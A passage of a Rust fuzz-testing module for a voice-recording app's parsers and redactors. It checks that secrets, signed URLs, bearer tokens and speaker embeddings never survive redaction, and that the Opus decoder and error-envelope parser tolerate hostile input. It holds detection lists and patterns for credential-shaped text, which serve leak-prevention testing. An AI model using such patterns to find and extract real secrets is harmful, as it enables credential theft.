                    }
                    assert!(
                        accepted_keys.len() <= FUZZ_MAX_ENTRIES,
                        "accepted more entries than the cap allows"
                    );
                }
                Err(err) => {
                    assert!(
                        !err.reason().rule().is_empty(),
                        "rejection without a stable rule"
                    );
                    assert!(
                        !err.label().chars().any(char::is_control),
                        "rejection label is not log-safe: {:?}",
                        err.label()
                    );
                }
            }
        }
        alloc_meter::stop();
        assert_allocation_bounded("archive_entry", input_len);

        assert_eq!(
            policy.accepted_entries(),
            accepted_keys.len(),
            "policy accounting disagrees with the accepted set"
        );
        assert_eq!(
            policy.accepted_bytes(),
            accepted_total,
            "policy byte accounting disagrees with the accepted set"
        );
    }

    // ---------------------------------------------------------------------
    // fuzz_redactor
    // ---------------------------------------------------------------------

    /// §16.2 "Credential disclosure" and "Signed URL leak", §16.6, App. B.7.
    ///
    /// Input format, shared by the corpus and the fuzzer:
    /// `<secret>` `NUL` `<body>`. The bytes before the first NUL are
    /// registered as a live secret; the rest is the record to redact. An input
    /// with no NUL registers nothing and exercises shape-pattern scanning
    /// alone.
    ///
    /// Invariants:
    /// * `redact` never panics and never slices a string off a character
    ///   boundary;
    /// * a successfully registered secret never appears in the output;
    /// * redaction terminates in **one** pass: re-redacting the output is a
    ///   fixed point (checked for records within the scan budget, where no
    ///   truncation notice is appended);
    /// * every reported finding is an in-bounds, character-aligned,
    ///   non-empty span of the input;
    /// * output size and allocation stay bounded by the input.
    pub fn check_redactor(data: &[u8]) {
        let input_len = data.len();
        let text = lossy(data);
        let (secret, body) = match text.split_once('\0') {
            Some((s, b)) => (Some(s.to_owned()), b.to_owned()),
            None => (None, text),
        };

        let redactor = Redactor::new();
        let registered = match secret.as_deref() {
            Some(s) => redactor.register_secret(s).is_ok(),
            None => false,
        };
        assert_eq!(
            redactor.registered_len(),
            usize::from(registered),
            "registry length disagrees with the registration result"
        );

        alloc_meter::start();
        let once = redactor.redact(&body).into_owned();
        alloc_meter::stop();
        assert_allocation_bounded("redactor", input_len);

        if registered {
            let s = secret.as_deref().unwrap_or_default();
            assert!(
                !once.contains(s),
                "registered secret survived redaction (secret {} B, body {} B)",
                s.len(),
                body.len()
            );
        }

        // Bounded passes: one pass must already be a fixed point. Records over
        // the scan budget are excluded because the redactor appends a
        // "<truncated: N bytes dropped unscanned>" notice, which legitimately
        // changes the output on each pass.
        if body.len() <= MAX_SCAN_BYTES {
            let twice = redactor.redact(&once).into_owned();
            assert_eq!(
                twice, once,
                "redaction did not reach a fixed point in one pass"
            );
        }

        for finding in redactor.matches(&body) {
            assert!(
                finding.start < finding.end,
                "empty finding span {finding:?}"
            );
            assert!(
                finding.end <= body.len(),
                "finding past the end of the record: {finding:?}"
            );
            assert!(
                body.is_char_boundary(finding.start) && body.is_char_boundary(finding.end),
                "finding span is not character-aligned: {finding:?}"
            );
            assert!(
                !finding.marker().is_empty(),
                "finding without a marker: {finding:?}"
            );
            assert!(
                !finding.marker().contains('\n'),
                "marker would inject a log line: {finding:?}"
            );
        }

        // §6.3A response guard over the same bytes. `secret_shape_of` maps byte
        // indices from an ASCII-lowercased copy back into the original, which is
        // only sound because `to_ascii_lowercase` preserves byte length; fuzzing
        // it with multibyte and replacement characters is what keeps that true.
        let shape = secret_shape_of(&body);
        let leaked = assert_no_secret_in_response(&serde_json::Value::String(body.clone()));
        assert_eq!(
            leaked.is_err(),
            shape.is_some(),
            "the response walker and the shape detector disagree on a bare string"
        );
        let nested = serde_json::json!({ "items": [{ "note": body.clone() }] });
        let nested_verdict = assert_no_secret_in_response(&nested);
        assert_eq!(
            nested_verdict.is_err(),
            shape.is_some(),
            "the response walker disagrees with itself once the value is nested"
        );
    }

    // ---------------------------------------------------------------------
    // fuzz_error_envelope
    // ---------------------------------------------------------------------

    /// §15.4 (error envelope), §6.6 (versioned inter-module contracts).
    ///
    /// The envelope is the one structure every failure is reported through, and
    /// it is persisted, so an envelope document is untrusted input the moment it
    /// is replayed from a log, a crash report or a diagnostics entry.
    ///
    /// Invariants:
    /// * `serde_json::from_str::<ErrorEnvelope>` never panics, however
    ///   malformed or deeply nested the document;
    /// * an `Ok` envelope's code is always a member of the closed
    ///   [`AppErrorCode::ALL`] set;
    /// * a document whose `code` is a string outside that closed set is always
    ///   an `Err` — there is no `#[serde(other)]`, so an unknown code can never
    ///   become a silent variant;
    /// * serialize → deserialize round-trips to an equal envelope, and the
    ///   code's wire string is exactly [`AppErrorCode::as_str`];
    /// * the diagnostic id round-trips through its canonical string form.
    pub fn check_error_envelope(data: &[u8]) {
        let input_len = data.len();
        let text = lossy(data);

        alloc_meter::start();
        let parsed = serde_json::from_str::<ErrorEnvelope>(&text);
        alloc_meter::stop();
        assert_allocation_bounded("error_envelope", input_len);

        // Independent oracle: read the raw document and compare verdicts.
        if let Ok(value) = serde_json::from_str::<serde_json::Value>(&text) {
            if let Some(declared) = value.get("code").and_then(serde_json::Value::as_str) {
                let known = AppErrorCode::ALL.iter().any(|c| c.as_str() == declared);
                if !known {
                    assert!(
                        parsed.is_err(),
                        "unknown error code {declared:?} was accepted into an envelope"
                    );
                }
            }
        }

        match parsed {
            Ok(envelope) => {
                assert!(
                    AppErrorCode::ALL.contains(&envelope.code),
                    "parsed a code outside the closed set: {:?}",
                    envelope.code
                );
                let wire = serde_json::to_value(envelope.code)
                    .expect("an error code always serializes")
                    .as_str()
                    .map(ToOwned::to_owned)
                    .expect("an error code serializes to a string");
                assert_eq!(
                    wire,
                    envelope.code.as_str(),
                    "wire string drifted from as_str()"
                );

                let encoded = serde_json::to_string(&envelope).expect("an envelope re-serializes");
                let round_tripped: ErrorEnvelope =
                    serde_json::from_str(&encoded).expect("a re-serialized envelope re-parses");
                assert_eq!(round_tripped, envelope, "envelope round-trip is not stable");

                if let Some(action) = envelope.action {
                    let action_wire = serde_json::to_value(action)
                        .expect("an action always serializes")
                        .as_str()
                        .map(ToOwned::to_owned)
                        .expect("an action serializes to a string");
                    assert!(
                        !action_wire.is_empty()
                            && action_wire
                                .chars()
                                .all(|c| c.is_ascii_uppercase() || c == '_'),
                        "action wire string is not SCREAMING_SNAKE_CASE: {action_wire:?}"
                    );
                }

                let id_text = envelope.diagnostic_id.to_string();
                let reparsed: DiagnosticId = id_text
                    .parse()
                    .expect("a diagnostic id round-trips through its string form");
                assert_eq!(reparsed, envelope.diagnostic_id);
            }
            Err(err) => {
                assert!(
                    !err.to_string().is_empty(),
                    "a rejection must describe itself"
                );
            }
        }
    }

    // ---------------------------------------------------------------------
    // fuzz_domain_redactor
    // ---------------------------------------------------------------------

    /// Documented default bound of [`DomainRedactor`]. Kept here as an
    /// independent oracle rather than read back from the type, which exposes
    /// no getter.
    pub const DOMAIN_REDACTOR_MAX_CHARS: usize = 512;

    /// Maximal runs of characters that look like an opaque credential:
    /// `[A-Za-z0-9_-]`, at least 20 long, containing both a digit and a letter.
    #[must_use]
    pub fn opaque_runs(text: &str) -> Vec<String> {
        let mut runs = Vec::new();
        let mut current = String::new();
        let mut flush = |current: &mut String| {
            if current.len() >= 20
                && current.chars().any(|c| c.is_ascii_digit())
                && current.chars().any(|c| c.is_ascii_alphabetic())
            {
                runs.push(current.clone());
            }
            current.clear();
        };
        for ch in text.chars() {
            if ch.is_ascii_alphanumeric() || ch == '-' || ch == '_' {
                current.push(ch);
            } else {
                flush(&mut current);
            }
        }
        flush(&mut current);
        runs
    }

    /// Key substrings the domain redactor documents as sensitive. An
    /// independent copy, deliberately a subset of the crate's own list: a
    /// shorter list can only ever make the assertion weaker, never wrong.
    pub const SENSITIVE_KEY_SUBSTRINGS: &[&str] = &[
        "token",
        "secret",
        "key",
        "password",
        "signature",
        "authorization",
        "cookie",
        "sig",
        "credential",
    ];

    /// `true` when the whole token, once stripped of leading and trailing
    /// punctuation, is a single opaque credential run — the shape the domain
    /// redactor's own `looks_like_opaque_secret` recognises.
    fn is_separator_free_opaque(token: &str) -> bool {
        let trimmed = token.trim_matches(|c: char| !c.is_ascii_alphanumeric());
        opaque_runs(trimmed)
            .first()
            .is_some_and(|run| run == trimmed)
    }

    /// §16.2 "Credential disclosure" and "Signed URL leak", §16.6.
    ///
    /// This is the domain crate's own small redactor, used by
    /// `AppError::from_unmapped_vendor` and `DiagnosticLog`, and documented as
    /// "over-redaction is acceptable; leaking is not".
    ///
    /// These are the invariants the documented contract already satisfies, so
    /// this function is the one the libFuzzer target drives. The stronger
    /// leak invariants live in [`check_domain_redactor_strict`], which is
    /// currently blocked by an EPIC B defect; see
    /// `domain_redactor_redacts_separator_bearing_credentials`.
    ///
    /// Invariants:
    /// * `redact` never panics and never slices off a character boundary;
    /// * redaction is token-aligned — it never invents a token, and the
    ///   *n*-th output token corresponds to the *n*-th input token;
    /// * a token that begins with a URL scheme, is an absolute POSIX path or a
    ///   Windows drive path, or is a separator-free opaque credential, is
    ///   replaced by the placeholder outright;
    /// * a `key=value` or `key:value` token whose key reads as sensitive ends
    ///   in the placeholder;
    /// * `Bearer ` is only ever followed by the placeholder or end of output;
    /// * the output respects the configured character bound, for the default
    ///   bound and for a custom one;
    /// * redaction reaches a fixed point in one pass.
    pub fn check_domain_redactor(data: &[u8]) {
        let input_len = data.len();
        let text = lossy(data);
        let redactor = DomainRedactor::default();

        alloc_meter::start();
        let out = redactor.redact(&text);
        alloc_meter::stop();
        assert_allocation_bounded("domain_redactor", input_len);

        let input_tokens: Vec<&str> = text.split_whitespace().collect();
        let output_tokens: Vec<&str> = out.split_whitespace().collect();
        assert!(
            output_tokens.len() <= input_tokens.len(),
            "redaction invented {} extra token(s)",
            output_tokens.len() - input_tokens.len()
        );

        // A truncated record carries a partial final token plus an ellipsis,
        // which cannot be compared against its input token.
        let aligned = if out.ends_with('…') {
            output_tokens.len().saturating_sub(1)
        } else {
            output_tokens.len()
        };

        for index in 0..aligned {
            let input_token = input_tokens[index];
            let output_token = output_tokens[index];
            let lower = input_token.to_ascii_lowercase();

            let url_at_token_start = lower.starts_with("http://")
                || lower.starts_with("https://")
                || lower.starts_with("file://");
            let filesystem_path = lower.starts_with('/') || lower.contains(":\\");

            if url_at_token_start || filesystem_path || is_separator_free_opaque(input_token) {
                assert_eq!(
                    output_token,
                    DomainRedactor::PLACEHOLDER,
                    "a URL, path or opaque credential survived redaction: {:?}",
                    &input_token[..input_token.len().min(80)]
                );
            }

            if let Some((key, _)) = input_token.split_once(['=', ':']) {
                let key_lower = key.to_ascii_lowercase();
                if SENSITIVE_KEY_SUBSTRINGS
                    .iter()
                    .any(|needle| key_lower.contains(needle))
                {
                    assert!(
                        output_token.ends_with(DomainRedactor::PLACEHOLDER),
                        "a sensitive key=value pair survived redaction: {:?}",
                        &input_token[..input_token.len().min(80)]
                    );
                }
            }
        }

        let mut rest = out.as_str();
        while let Some(at) = rest.find("Bearer ") {
            let after = &rest[at + "Bearer ".len()..];
            assert!(
                after.is_empty() || after.starts_with(DomainRedactor::PLACEHOLDER),
                "a bearer credential survived redaction: {:?}",
                &after[..after.len().min(64)]
            );
            rest = after;
        }

        assert!(
            out.chars().count() <= DOMAIN_REDACTOR_MAX_CHARS + 1,
            "redacted output is {} characters, over the {DOMAIN_REDACTOR_MAX_CHARS} bound \
             plus its ellipsis",
            out.chars().count()
        );
        let tight = DomainRedactor::with_max_len(32);
        assert!(
            tight.redact(&text).chars().count() <= 33,
            "a custom length bound was not respected"
        );

        assert_eq!(
            redactor.redact(&out),
            out,
            "redaction is not a fixed point after one pass"
        );
    }

    /// The full §16.2 leak invariants for the domain redactor: **nothing**
    /// secret-shaped from the input may appear in the output, wherever it sat
    /// inside its whitespace-delimited token.
    ///
    /// * no `http://`, `https://` or `file://` survives in any casing — a URL
    ///   can carry a signed query string, which the §16.2 "Signed URL leak"
    ///   row forbids in a log;
    /// * no run of 20 or more opaque credential characters that was present in
    ///   the input survives in the output, including the segments of a dotted
    ///   credential such as a JWT.
    ///
    /// This is written as the invariant should hold, not as the code currently
    /// behaves: it passes unchanged once the EPIC B defect is fixed. See
    /// `domain_redactor_redacts_separator_bearing_credentials`.
    pub fn check_domain_redactor_strict(data: &[u8]) {
        let text = lossy(data);
        let out = DomainRedactor::default().redact(&text);

        let lowered = out.to_ascii_lowercase();
        for scheme in ["http://", "https://", "file://"] {
            assert!(
                !lowered.contains(scheme),
                "{scheme} survived redaction: {:?}",
                &out[..out.len().min(160)]
            );
        }

        for run in opaque_runs(&out) {
            assert!(
                !text.contains(&run),
                "an opaque credential run survived redaction: {:?}",
                &run[..run.len().min(64)]
            );
        }
    }

    // ---------------------------------------------------------------------
    // fuzz_opus_packet
    // ---------------------------------------------------------------------

    /// §16.2 "Malicious audio decoder input", §18.5 (media parsers), App. B.7,
    /// ADR-0015. Task O1.6 (#214).
    ///
    /// The input is one raw RFC 6716 Opus packet, which is what a device
    /// `.ASR` sidecar and every Ogg Opus import ultimately hand the decoder.
    /// Both channel counts are exercised from the same bytes, because a
    /// packet coded for one and decoded as the other is a real case: an Ogg
    /// stream states its channel count in `OpusHead`, which the file controls.
    ///
    /// Invariants:
    /// * `OpusPacketDecoder::decode` never panics, whatever the bytes;
    /// * a refusal is one of our typed errors with a non-empty stable detail,
    ///   never a partially decoded frame;
    /// * an accepted packet produces at most one Opus frame
    ///   (`MAX_FRAME_SAMPLES_PER_CHANNEL` per channel), an exact multiple of
    ///   the channel count, and only finite samples — silence is never
    ///   substituted for audio that failed to decode;
    /// * decoding allocates from the bytes present, not from what the packet
    ///   claims: the decoder's buffers are sized once at construction.
    pub fn check_opus_packet(data: &[u8]) {
        let input_len = data.len().min(MAX_INPUT_BYTES);
        let data = &data[..input_len];

        for channels in [1u8, 2] {
            let params =
                OpusStreamParams::rtp(channels).expect("1 and 2 are family-0 channel counts");
            let mut decoder =
                OpusPacketDecoder::new(params).expect("a family-0 decoder always builds");

            alloc_meter::start();
            let accepted = match decoder.decode(data) {
                Ok(pcm) => {
                    let channels = usize::from(channels);
                    assert!(!pcm.is_empty(), "accepted a packet but produced no audio");
                    assert_eq!(
                        pcm.len() % channels,
                        0,
                        "produced {} samples for {channels} channels",
                        pcm.len()
                    );
                    assert!(
                        pcm.len() / channels <= MAX_FRAME_SAMPLES_PER_CHANNEL,
                        "produced {} samples per channel, over the \
                         {MAX_FRAME_SAMPLES_PER_CHANNEL} cap",
                        pcm.len() / channels
                    );
                    assert!(
                        pcm.iter().all(|sample| sample.is_finite()),
                        "produced a non-finite sample"
                    );
                    true
                }
                Err(error) => {
                    assert!(
                        !error.detail().is_empty(),
                        "a refusal must carry a stable reason: {error}"
                    );
                    assert!(
                        !error.to_string().is_empty(),
                        "a refusal must be reportable to the user"
                    );
                    false
                }
            };
            alloc_meter::stop();
            assert_allocation_bounded("opus_packet", input_len);

            // The decoder must survive the packet: a reset followed by the
            // same bytes behaves identically, which is what the player does
            // after a seek.
            decoder.reset();
            assert_eq!(
                accepted,
                decoder.decode(data).is_ok(),
                "the decoder's verdict changed after a reset"
            );
        }
    }

    // ---------------------------------------------------------------------
    // fuzz_embedding_blob
    // ---------------------------------------------------------------------

    /// Field-name spellings the `voice_embedding` pattern keys on.
    ///
    /// An independent transcription of the alternation inside
    /// `plaudon_diagnostics::patterns`' VP-112 pattern: if the two ever
    /// disagree, the disagreement has to be argued for here rather than
    /// happening silently.
    pub const EMBEDDING_FIELD_SPELLINGS: &[&str] = &[
        "embedding",
        "embeddings",
        "voiceprint",
        "speaker_vector",
        "exemplar_vector",
        "centroid_vector",
        "exemplar_cipher",
    ];

    /// Key names `plaudon_security::response` treats as embedding-bearing,
    /// matched exactly or as a `_`-suffixed form. The production list is
    /// private; this is the independent oracle for it.
    pub const EMBEDDING_KEY_NAMES: &[&str] = &[
        "embedding",
        "embeddings",
        "embedding_cipher",
        "embedding_nonce",
        "voiceprint",
        "voiceprints",
        "speaker_vector",
        "exemplar_vector",
        "centroid_vector",
    ];

    /// Shortest bracketed numeric list treated as a speaker embedding.
    pub const MIN_VECTOR_COMPONENTS: usize = 16;

    /// Shortest value a named embedding field must carry before the field is
    /// data rather than prose ("the embedding: approach" is a sentence).
    pub const MIN_EMBEDDING_VALUE_CHARS: usize = 16;

    /// Whether `key` names a field whose value is (or wraps) an embedding.
    #[must_use]
    pub fn is_embedding_key(key: &str) -> bool {
        let lowered = key.to_ascii_lowercase();
        EMBEDDING_KEY_NAMES
            .iter()
            .any(|name| lowered == *name || lowered.ends_with(&format!("_{name}")))
    }

    /// The prefix of `text` the redactor actually scans. An independent
    /// reimplementation of `redact`'s private `truncate_at_boundary`:
    /// everything past this point is dropped and replaced by a
    /// `<truncated:…>` notice, so it can carry nothing out.
    fn scanned_head(text: &str) -> &str {
        if text.len() <= MAX_SCAN_BYTES {
            return text;
        }
        let mut end = MAX_SCAN_BYTES;
        while !text.is_char_boundary(end) {
            end -= 1;
        }
        &text[..end]
    }

    const fn is_blob_char(b: u8) -> bool {
        b.is_ascii_alphanumeric() || matches!(b, b'+' | b'/' | b'_' | b'-')
    }

    const fn is_name_char(b: u8) -> bool {
        b.is_ascii_alphanumeric() || matches!(b, b'_' | b'.' | b'-')
    }

    const fn is_value_char(b: u8) -> bool {
        b.is_ascii_alphanumeric() || matches!(b, b'+' | b'/' | b'=' | b'_' | b'.' | b'-')
    }

    fn skip_ws(bytes: &[u8], from: usize) -> usize {
        let mut index = from;
        while matches!(bytes.get(index), Some(b) if b.is_ascii_whitespace()) {
            index += 1;
        }
        index
    }

    /// Offset and length of the first continuous run of at least
    /// [`MIN_BLOB_CHARS`] opaque token characters — a sealed exemplar, a
    /// base64 frame, a long hex digest — or `None`.
    ///
    /// Markers need no exemption: `<redacted:…>` and `<truncated:…>` are built
    /// from short words separated by `<`, `:` and `>`, none of which is a blob
    /// character, so a marker cannot itself form a run this long. A violation
    /// is therefore always real payload.
    #[must_use]
    pub fn first_blob_run(text: &str) -> Option<(usize, usize)> {
        let bytes = text.as_bytes();
        let mut index = 0usize;
        while index < bytes.len() {
            if !is_blob_char(bytes[index]) {
                index += 1;
                continue;
            }
            let start = index;
            while index < bytes.len() && is_blob_char(bytes[index]) {
                index += 1;
            }
            if index - start >= MIN_BLOB_CHARS {
                return Some((start, index - start));
            }
        }
        None
    }

    /// End offset of a number in exactly the grammar the `float_vector`
    /// pattern accepts (`-?\d+(\.\d+)?([eE][+-]?\d+)?`), or `None`.
    ///
    /// Deliberately no broader than the pattern — ASCII digits only, no
    /// leading `+`, no bare `1.` — because this oracle's job is to fail the
    /// build when a vector *survives*. Erring narrow costs a missed report;
    /// erring wide would invent crashes the redactor is not answerable for.
    fn number_end(bytes: &[u8], from: usize) -> Option<usize> {
        let mut index = from;
        if bytes.get(index) == Some(&b'-') {
            index += 1;
        }
        let digits = index;
        while matches!(bytes.get(index), Some(b) if b.is_ascii_digit()) {
            index += 1;
        }
        if index == digits {
            return None;
        }
        if bytes.get(index) == Some(&b'.') {
            let mut frac = index + 1;
            while matches!(bytes.get(frac), Some(b) if b.is_ascii_digit()) {
                frac += 1;
            }
            if frac > index + 1 {
                index = frac;
            }
        }
        if matches!(bytes.get(index), Some(b'e' | b'E')) {
            let mut exp = index + 1;
            if matches!(bytes.get(exp), Some(b'+' | b'-')) {
                exp += 1;
            }
            let start = exp;
            while matches!(bytes.get(exp), Some(b) if b.is_ascii_digit()) {
                exp += 1;
            }
            if exp > start {
                index = exp;
            }
        }
        Some(index)
    }

    /// Number of components in the `,`-separated numeric list starting at
    /// `from`, counted no further than [`MIN_VECTOR_COMPONENTS`] so a single
    /// enormous list cannot make the oracle the slow part.
    fn vector_components_at(bytes: &[u8], from: usize) -> usize {
        let mut index = from;
        let mut count = 0usize;
        loop {
            index = skip_ws(bytes, index);
            let Some(after) = number_end(bytes, index) else {
                return count;
            };
            index = after;
            count += 1;
            if count >= MIN_VECTOR_COMPONENTS {
                return count;
            }
            index = skip_ws(bytes, index);
            if bytes.get(index) != Some(&b',') {
                return count;
            }
            index += 1;
        }
    }

    /// Offset of the first bracketed list of at least
    /// [`MIN_VECTOR_COMPONENTS`] numbers — a plain-text speaker embedding —
    /// or `None`. The closing `]` is not required: a vector cut off by a line
    /// width or a buffer edge is still an embedding.
    #[must_use]
    pub fn first_float_vector(text: &str) -> Option<usize> {
        let bytes = text.as_bytes();
        (0..bytes.len()).find(|&open| {
            bytes[open] == b'[' && vector_components_at(bytes, open + 1) >= MIN_VECTOR_COMPONENTS
        })
    }

    /// Offset just past a `"?\s*[:=]\s*"?` separator starting at `from`.
    fn separator_end(bytes: &[u8], from: usize) -> Option<usize> {
        let mut index = from;
        if bytes.get(index) == Some(&b'"') {
            index += 1;
        }
        index = skip_ws(bytes, index);
        if !matches!(bytes.get(index), Some(b':' | b'=')) {
            return None;
        }
        index = skip_ws(bytes, index + 1);
        if bytes.get(index) == Some(&b'"') {
            index += 1;
        }
        Some(index)
    }

    /// Whether the value at `from` is data rather than prose: a bracketed
    /// list, or a run of at least [`MIN_EMBEDDING_VALUE_CHARS`] token
    /// characters. A marker starts with `<`, which is neither.
    fn value_is_data_shaped(bytes: &[u8], from: usize) -> bool {
        if bytes.get(from) == Some(&b'[') {
            return true;
        }
        let mut index = from;
        while matches!(bytes.get(index), Some(b) if is_value_char(*b)) {
            index += 1;
        }
        index - from >= MIN_EMBEDDING_VALUE_CHARS
    }

    /// Offset of the first embedding-named field still carrying a value, or
    /// `None`.
    ///
    /// A candidate whose name run is preceded by a word character is skipped:
    /// the pattern anchors on `\b`, so `éembedding=…` genuinely does not match
    /// it, and claiming a hit there would report a crash the redactor cannot
    /// be held to.
    #[must_use]
    pub fn first_embedding_field(text: &str) -> Option<usize> {
        let lowered = text.to_ascii_lowercase();
        let bytes = lowered.as_bytes();
        let mut index = 0usize;
        while index < bytes.len() {
            if !is_name_char(bytes[index]) {
                index += 1;
                continue;
            }
            let start = index;
            while index < bytes.len() && is_name_char(bytes[index]) {
                index += 1;
            }
            let name = &lowered[start..index];
            if !EMBEDDING_FIELD_SPELLINGS.iter().any(|s| name.contains(s)) {
                continue;
            }
            if lowered[..start]
                .chars()
                .next_back()
                .is_some_and(|c| c.is_alphanumeric() || c == '_')
            {
                continue;
            }
            if let Some(value) = separator_end(bytes, index) {
                if value_is_data_shaped(bytes, value) {
                    return Some(start);
                }
            }
        }
        None
    }

    /// Whether any object in `value` carries an embedding-named key with a
    /// non-null value. Walks the document independently of the response
    /// guard, so the two have to agree about what is in it.
    fn carries_embedding_key(value: &serde_json::Value) -> bool {
        match value {
            serde_json::Value::Object(map) => map.iter().any(|(name, item)| {
                (!item.is_null() && is_embedding_key(name)) || carries_embedding_key(item)
            }),
            serde_json::Value::Array(items) => items.iter().any(carries_embedding_key),
            _ => false,
        }
    }

    /// VOICE_PROFILES_SPEC VP-112 and VP-185, threat-model TM-044, spec §6.3A
    /// and §15.4.
    ///
    /// The whole input is one record on its way to a sink: a log line, a crash
    /// payload, a notification body, a command result. VP-112 states the rule
    /// in one sentence — a speaker embedding never leaves this process — so
    /// whatever shape the bytes arrive in, the redacted form may not still
    /// carry one, and a response document may not carry one at all.
    ///
    /// Invariants:
    /// * `Redactor::redact` never panics and is a fixed point on its own
    ///   output, for records inside the scan budget (over it, the appended
    ///   `<truncated:…>` notice legitimately changes the output each pass);
    /// * the redacted output contains no continuous run of [`MIN_BLOB_CHARS`]
    ///   token characters, no bracketed list of [`MIN_VECTOR_COMPONENTS`]
    ///   numbers and no embedding-named field still holding a data-shaped
    ///   value — re-detected from scratch by the oracles above, never by
    ///   looking for markers;
    /// * redaction *fired* when the scanned prefix held one of those shapes,
    ///   so "nothing survived" can never be satisfied by doing nothing;
    /// * allocation stays bounded by the input;
    /// * §6.3A: `assert_no_secret_in_response` refuses every document that
    ///   carries an embedding-named key with a non-null value, refuses a value
    ///   placed under such a key with [`SecretShape::VoiceEmbedding`] whatever
    ///   the value is, and still accepts an explicit `null`.
    ///
    /// Honest scope: the refusal direction is the only one asserted over fuzz
    /// data. A document carrying no embedding may still be refused for another
    /// shape (a bearer token, a device token), which is correct and is
    /// `check_redactor`'s business, not this target's.
    pub fn check_embedding_blob(data: &[u8]) {
        let input_len = data.len();
        let text = lossy(data);
        let redactor = Redactor::new();

        alloc_meter::start();
        let once = redactor.redact(&text).into_owned();
        alloc_meter::stop();
        assert_allocation_bounded("embedding_blob", input_len);

        let surviving_blob = first_blob_run(&once);
        assert!(
            surviving_blob.is_none(),
            "an opaque run survived redaction (offset, length) = {surviving_blob:?}, \
             threshold {MIN_BLOB_CHARS}"
        );
        let surviving_vector = first_float_vector(&once);
        assert!(
            surviving_vector.is_none(),
            "a numeric vector of at least {MIN_VECTOR_COMPONENTS} components survived \
             redaction at byte {surviving_vector:?}"
        );
        let surviving_field = first_embedding_field(&once);
        assert!(
            surviving_field.is_none(),
            "an embedding-named field kept a data-shaped value through redaction, \
             at byte {surviving_field:?}"
        );

        if text.len() <= MAX_SCAN_BYTES {
            let twice = redactor.redact(&once).into_owned();
            assert_eq!(
                twice, once,
                "redaction did not reach a fixed point in one pass"
            );
        }

        // Non-vacuity: if the bytes the redactor actually scanned held one of
        // the shapes, something must have been replaced. Every marker this
        // crate emits starts with `<redacted:`.
        let head = scanned_head(&text);
        if first_blob_run(head).is_some()
            || first_float_vector(head).is_some()
            || first_embedding_field(head).is_some()
        {
            assert!(
                once.contains("<redacted:"),
                "an embedding-shaped span was inside the scan budget but nothing was redacted"
            );
        }

        // §6.3A. The key rule is applied before the value is walked, so the
        // verdict for a value under an embedding-named key does not depend on
        // the value — which is exactly what VP-112 needs: no encoding of an
        // embedding can be smuggled out under its own name.
        for key in EMBEDDING_KEY_NAMES.iter().copied().chain([
            "voice_embedding",
            "speaker_embedding",
            "profile_voiceprint",
        ]) {
            let mut map = serde_json::Map::new();
            map.insert(key.to_owned(), serde_json::Value::String(text.clone()));
            let error = assert_no_secret_in_response(&serde_json::Value::Object(map))
                .expect_err("a value under an embedding-named key must be refused");
            assert_eq!(
                error.shape,
                SecretShape::VoiceEmbedding,
                "key {key} was refused for the wrong reason"
            );
            assert_eq!(error.pointer, format!("/{key}"));
        }

        // The rule is not "refuse everything": the absence of an embedding is
        // not an embedding.
        let mut absent = serde_json::Map::new();
        absent.insert("embedding".to_owned(), serde_json::Value::Null);
        assert!(
            assert_no_secret_in_response(&serde_json::Value::Object(absent)).is_ok(),
            "an explicit null embedding was refused"
        );

        alloc_meter::start();
        let parsed = serde_json::from_str::<serde_json::Value>(&text);
        alloc_meter::stop();
        assert_allocation_bounded("embedding_blob json", input_len);

        if let Ok(value) = parsed {
            if carries_embedding_key(&value) {
                assert!(
                    assert_no_secret_in_response(&value).is_err(),
                    "a document carrying an embedding-named key was allowed out (§6.3A)"
                );
            }
            if !value.is_null() {
                let mut wrapper = serde_json::Map::new();
                wrapper.insert("embedding".to_owned(), value);
                let error = assert_no_secret_in_response(&serde_json::Value::Object(wrapper))
                    .expect_err("a non-null value under `embedding` must be refused");
                assert_eq!(error.shape, SecretShape::VoiceEmbedding);
                assert_eq!(error.pointer, "/embedding");
            }
        }
    }
}

// =========================================================================
// Stable-toolchain corpus replay. Stripped when this file is compiled as a
// module of a libFuzzer target.
// =========================================================================

#[cfg(test)]
#[global_allocator]
static COUNTING_ALLOCATOR: replay::CountingAllocator = replay::CountingAllocator;

#[cfg(test)]
mod replay {
    use std::alloc::{GlobalAlloc, Layout, System};
    use std::path::{Path, PathBuf};
    use std::time::{Duration, Instant};

    use super::checks;

    /// Counting allocator installed only for the `cargo test` build, so the
    /// replay can assert a real allocation ceiling per corpus entry.
    pub struct CountingAllocator;

    #[allow(unsafe_code)]
    unsafe impl GlobalAlloc for CountingAllocator {
        unsafe fn alloc(&self, layout: Layout) -> *mut u8 {
            let ptr = unsafe { System.alloc(layout) };
            if !ptr.is_null() {
                checks::alloc_meter::on_alloc(layout.size());
            }
            ptr
        }

        unsafe fn dealloc(&self, ptr: *mut u8, layout: Layout) {
            checks::alloc_meter::on_dealloc(layout.size());
            unsafe { System.dealloc(ptr, layout) };
        }

        unsafe fn realloc(&self, ptr: *mut u8, layout: Layout, new_size: usize) -> *mut u8 {
            let out = unsafe { System.realloc(ptr, layout, new_size) };
            if !out.is_null() {
                checks::alloc_meter::on_dealloc(layout.size());
                checks::alloc_meter::on_alloc(new_size);
            }
            out
        }
    }

    /// Wall-clock budget for a single corpus entry. A parser that takes longer
    /// than this on a few kilobytes of hostile input is a denial-of-service
    /// vector, which §18.5 requires us to catch here rather than in production.
    const PER_ENTRY_BUDGET: Duration = Duration::from_secs(5);

    fn corpus_root() -> PathBuf {
        Path::new(env!("CARGO_MANIFEST_DIR"))
            .join("../../tests/fixtures/fuzz-corpus")
            .canonicalize()
            .expect("the committed fuzz corpus directory must exist")
    }

    fn corpus_dir(target: &str) -> PathBuf {
        corpus_root().join(target)
    }

    /// Feed every file in the target's corpus through `check`, asserting that
    /// none of them panics, hangs or allocates without bound. Returns the
    /// number of entries replayed.
    fn replay(target: &str, check: fn(&[u8])) -> usize {
        let dir = corpus_dir(target);
        let mut entries: Vec<PathBuf> = std::fs::read_dir(&dir)
            .unwrap_or_else(|e| panic!("missing corpus directory {}: {e}", dir.display()))
            .map(|e| e.expect("readable corpus entry").path())
            .filter(|p| p.is_file())
            .collect();
        entries.sort();
        assert!(!entries.is_empty(), "corpus {} is empty", dir.display());

        for path in &entries {
            let data = std::fs::read(path).expect("readable corpus entry");
            let started = Instant::now();
            check(&data);
            let elapsed = started.elapsed();
            assert!(
                elapsed < PER_ENTRY_BUDGET,
                "{target}/{}: took {elapsed:?}, over the {PER_ENTRY_BUDGET:?} budget",
                path.file_name().unwrap_or_default().to_string_lossy()
            );
        }
        entries.len()
    }

    /// Hostile filename list owned by D2.2 (`Team-D.PathGuard`),
    /// `tests/fixtures/hostile-paths/names.txt`. Read and decoded at test time
